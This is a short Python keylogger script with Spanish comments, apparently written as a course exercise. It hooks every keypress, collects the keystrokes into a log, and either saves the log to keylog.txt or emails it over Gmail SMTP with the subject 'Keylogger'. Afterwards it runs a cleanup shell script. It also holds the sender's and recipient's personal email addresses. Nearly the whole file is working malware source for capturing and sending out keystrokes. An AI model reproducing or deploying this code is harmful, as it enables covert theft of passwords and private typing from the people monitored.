import keyboard
import os
from dotenv import load_dotenv
from email.message import EmailMessage
import ssl
import smtplib
import subprocess

bash_command = "./cleanup.sh"

load_dotenv()

# Variables globales
log = ""
email_sender = "killerhaans@gmail.com"
password = os.getenv("PASSWORD")
email_reciver = "jesuslopez@ciencias.unam.mx"

# Funcion para el envio de correo
def send_email(log):
    msg = EmailMessage()
    msg["From"] = email_sender
    msg["To"] = email_reciver
    msg["Subject"] = "Keylogger"
    msg.set_content(log)

    context = ssl.create_default_context()

    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(email_sender, password)
        server.send_message(msg)

# Funcion para capturar las teclas presionadas
def on_key(event):
    global log
    if(event.name == 'space'):
        log += ' '
    elif(event.name == 'enter'):
        log += '\n'
    elif(event.name == 'backspace'):
        log = log
    else:
        log += event.name

# Funcion para mostrar el menu
def menu():
    print("¿Qué te gustaría hacer con los datos capturados?")
    print("1. Guardar en un archivo de texto")
    print("2. Enviar por correo electrónico")
    choice = input("Ingresa tu elección (1 o 2): ")
    return choice

# Funcion para guardar los datos en un archivo de texto
def save_to_file(log):
    with open("keylog.txt", "w") as f:
        f.write(log)
    print("Los datos han sido guardados en 'keylog.txt'.")

# Funcion principal
def main():
    global log
    choice = menu()
    keyboard.on_press(on_key)
    
    print("Keylogger en ejecución... Presiona 'ESC' para detener.")

    keyboard.wait('esc')

    if choice == '1':
        save_to_file(log)
    elif choice == '2':
        send_email(log)
    else:
        print("Elección no válida.")
    
    try:
        subprocess.run(bash_command)
    except Exception as e:
        print("Error al ejecutar el script de limpieza.")

if __name__ == "__main__":
    main()
